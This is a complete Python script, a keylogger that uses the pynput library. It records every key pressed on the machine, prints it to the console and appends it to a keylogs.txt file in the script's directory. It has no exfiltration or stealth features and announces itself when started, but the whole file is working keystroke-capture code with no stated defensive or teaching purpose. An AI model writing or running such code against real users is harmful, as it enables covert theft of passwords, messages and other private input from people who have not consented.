from pynput import keyboard
import time
import sys
import os

# Set log file path to the current script directory
script_dir = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(script_dir, "keylogs.txt")

def on_press(key):
    try:
        log_entry = f"{key.char}"
    except AttributeError:
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\n"
        else:
            log_entry = f"[{key}]"
    
    # Print to console for realtime debugging
    print(log_entry, end='', flush=True)

    # Append to log file
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"\n[!] Error writing to file: {e}")

def main():
    print("-" * 50)
    print("[+] Keylogger Started Successfully")
    print(f"[+] Saving logs to: {LOG_FILE}")
    print("[!] Press CTRL+C to stop")
    print("-" * 50)

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep the script running
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n\n[!] Stopping keylogger...")
        listener.stop()
        sys.exit()

if __name__ == "__main__":
    main()